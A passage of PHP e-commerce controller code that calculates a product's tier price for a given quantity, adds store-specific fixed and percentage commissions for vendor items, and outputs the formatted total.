  			$tierdata = array_filter($tier_prices, function($el) use ($quantity)
  			{
  			return ($el['price_qty'] <= $quantity);
  			});
  			$tcnt = count($tierdata);
  			$tierpriceinfo = $tierdata[$tcnt-1];

  			if($prod->user_id != 0){
                if (Session::has('FRONT_STORE_ID')){
                $this->store_id = session('FRONT_STORE_ID');
                $store_code = $this->store_code = session('FRONT_STORE_CODE');
                }else{
                $ip = $_SERVER['REMOTE_ADDR'];
                $storeinfo = $this->getCurrentStoreLocation($ip);
                $this->store_id = $storeinfo->id;
                $store_code = $this->store_code = $storeinfo->store_code;
                session()->put('FRONT_STORE_CODE', $store_code);
                session()->put('FRONT_STORE_ID', $this->store_id);
                }
                $gs = Generalsetting::where('store_id',$this->store_id)->first();
  			$itemprice = $tierpriceinfo['price'] + $gs->fixed_commission + ($tierpriceinfo['price']/100) * $gs->percentage_commission;
  			}else{
  			$itemprice = $tierpriceinfo['price'];
  			}
  		}
      $totalprice = ($itemprice*$quantity);
      echo number_format($totalprice,2);
      die();

  	}
}
